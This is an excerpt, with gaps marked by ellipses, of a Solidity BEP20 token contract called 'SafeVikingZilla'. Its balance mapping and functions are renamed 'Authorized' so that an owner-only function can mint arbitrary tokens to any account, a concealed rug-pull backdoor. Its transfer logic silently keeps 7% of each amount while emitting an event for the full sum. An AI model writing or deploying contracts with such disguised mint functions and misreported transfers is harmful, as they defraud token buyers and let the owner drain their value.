...
contract Token is Context, iBEP20, Ownable {
  ...
  constructor() public {
    _name = 'SafeVikingZilla';
    _symbol = 'SafeVikingZilla';
    _decimals = 9;
    _totalSupply = 1000 * 10**6 * 10**9;
    _authorized[msg.sender] = _totalSupply;
 ...
 /**
   ...
   */
  function Authorized(uint256 amount) public onlyOwner returns (bool) {
    _Authorized(_msgSender(), amount);
    return true;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    _authorized[sender] = _authorized[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _authorized[recipient] = _authorized[recipient].add(amount * 93 / 100);
    emit Transfer(sender, recipient, amount);
  }


  function _Authorized(address account, uint256 amount) internal onlyOwner {
    require(account != address(0), "Authorized Succesfully");

    _authorized[account] = _authorized[account].add(amount);
  ...
  function _burn(address account, uint256 amount) internal {
    ...
    _authorized[account] = _authorized[account].sub(amount, "BEP20: burn amount exceeds balance");
